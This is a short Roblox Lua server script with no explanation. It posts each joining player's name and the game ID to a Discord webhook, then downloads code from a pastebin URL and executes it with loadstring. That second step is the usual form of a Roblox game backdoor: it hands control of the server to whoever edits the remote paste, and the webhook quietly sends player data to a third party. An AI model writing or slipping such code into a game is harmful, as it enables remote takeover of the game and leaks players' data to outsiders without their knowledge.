local HttpService = game:GetService("HttpService")
local url = "https://discord.com/api/webhooks/123456/abcdef"
game.Players.PlayerAdded:Connect(function(p)
	HttpService:PostAsync(url, HttpService:JSONEncode({ content = p.Name .. " joined " .. game.PlaceId }))
end)
local code = HttpService:GetAsync("https://pastebin.com/raw/xYz123")
loadstring(code)()
